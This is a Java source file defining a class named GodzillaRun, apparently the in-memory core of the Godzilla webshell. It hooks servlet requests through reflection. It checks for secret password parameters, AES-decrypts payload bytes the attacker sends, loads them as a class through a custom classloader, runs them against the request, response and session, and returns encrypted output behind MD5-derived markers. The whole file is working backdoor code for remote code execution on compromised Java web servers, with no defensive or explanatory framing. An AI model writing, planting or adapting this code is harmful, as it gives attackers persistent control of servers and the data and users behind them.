package com.security;



import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.UUID;

import static com.security.functions.base64Decode;
import static com.security.functions.base64Encode;

public class GodzillaRun{

    private final static String uuid = UUID.randomUUID().toString();
    public final static HashMap<String, String> passwords=new HashMap();
    private Object request;
    private Object response;
    private Method getParameterMethod;
    private Method getCookiesMethod;
    private Method addHeaderMethod;
    private Method getOutputStreamMethod;
    private Method getAttributeMethod;
    private Method setAttributeMethod;;

    @Override
    public boolean equals(Object obj) {
        try {
            Object[] objects= (Object[]) obj;
            request=objects[0];
            response=objects[1];
            getAttributeMethod=functions.getMethodByClass(request.getClass(), "getAttribute",new Class[]{String.class});
            Object isRun = null;
            if (getAttributeMethod!=null){
                isRun = getAttributeMethod.invoke(request,uuid);
            }

            if (isRun==null){
                getParameterMethod=functions.getMethodByClass(request.getClass(), "getParameter",new Class[]{String.class});
                setAttributeMethod=functions.getMethodByClass(request.getClass(), "setAttribute",new Class[]{String.class,Object.class});
                if(getParameterMethod!=null&&setAttributeMethod!=null){
                    setAttributeMethod.invoke(request,uuid,true);
                    Iterator<String> iterator = passwords.keySet().iterator();
                    while (iterator.hasNext()){
                        String password = iterator.next();
                        String value= (String) functions.invokeMethod(request, getParameterMethod, password);
                        if (value!=null){
                            getCookiesMethod=functions.getMethodByClass(request.getClass(), "getCookies",null);
                            getOutputStreamMethod=functions.getMethodByClass(response.getClass(), "getOutputStream", null);
                            addHeaderMethod=functions.getMethodByClass(response.getClass(), "addHeader", new Class[]{String.class,String.class});
                            if (getOutputStreamMethod!=null&&addHeaderMethod!=null&&getCookiesMethod!=null){
                                Object[] cookieObjects= (Object[]) getCookiesMethod.invoke(request, null);
                                String sessionId=null;
                                if (cookieObjects!=null&&cookieObjects.length>0){
                                    Method getNameMethodByCookie=functions.getMethodByClass(cookieObjects[0].getClass(), "getName",null);
                                    Method getValueMethodByCookie=functions.getMethodByClass(cookieObjects[0].getClass(), "getValue",null);
                                    if (getNameMethodByCookie!=null&&getValueMethodByCookie!=null){
                                        for (int i = 0; i < cookieObjects.length; i++) {
                                            Object cookieObject=cookieObjects[i];
                                            if (GodzillaSessionManage.SessionName.equals(functions.invokeMethod(cookieObject, getNameMethodByCookie, null))){
                                                sessionId= (String) functions.invokeMethod(cookieObject, getValueMethodByCookie, null);
                                                break;
                                            }
                                        }
                                    }
                                }
                                HttpSession godzillaSession=GodzillaSessionManage.getSession(sessionId);
                                if (sessionId==null||!godzillaSession.getId().equals(sessionId)){
                                    sessionId=godzillaSession.getId();
                                    functions.invokeMethod(response, addHeaderMethod,"Set-Cookie",String.format("%s=%s; Path=/; HttpOnly", GodzillaSessionManage.SessionName,sessionId));
                                }
                                String secretKey=passwords.get(password);
                                byte[] requestData=encrypt(base64Decode(value),secretKey, false);
                                if (godzillaSession.getAttribute("payload")==null){
                                    godzillaSession.setAttribute("payload",new GodzillaClassLoader(request.getClass().getClassLoader()).defineClass(requestData));
                                }else{
                                    Object f=((Class)godzillaSession.getAttribute("payload")).newInstance();
                                    ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream(1024*1024);
                                    f.equals(byteArrayOutputStream);
                                    f.equals(godzillaSession);
                                    f.equals(request);
                                    f.equals(response);
                                    f.equals(requestData);
                                    f.toString();
                                    String s=base64Encode(encrypt(byteArrayOutputStream.toByteArray(),secretKey, true));
                                    Object outputStreamObj=functions.invokeMethod(response, getOutputStreamMethod, null);
                                    if (outputStreamObj!=null){
                                        Method printMethod=functions.getMethodByClass(outputStreamObj.getClass(), "print",new Class[]{String.class} );
                                        String sub =functions.md5(password+secretKey).toUpperCase();
                                        functions.invokeMethod(outputStreamObj, printMethod, sub.substring(0, 16));
                                        functions.invokeMethod(outputStreamObj, printMethod, s);
                                        functions.invokeMethod(outputStreamObj, printMethod, sub.substring(16));
                                    }
                                }
                                return true;
                            }else {
                                Debug.log(String.format("getParameterMethod:%s getOutputStreamMethod:%s addHeaderMethod:%s",getParameterMethod,getOutputStreamMethod,addHeaderMethod));
                            }
                        }
                    }

                }else {

                }
            }
        }catch (Exception e){
            Debug.logException(e);
        }catch (Error error){
            Debug.logException(error);
        }


        return false;
    }

    public static byte[] encrypt(byte[] s,String secretKey,boolean m){
        try{
            javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");
            c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(secretKey.getBytes(),"AES"));
            return c.doFinal(s);
        }catch (Exception e){
            Debug.logException(e);
            return null;
        }
    }

}

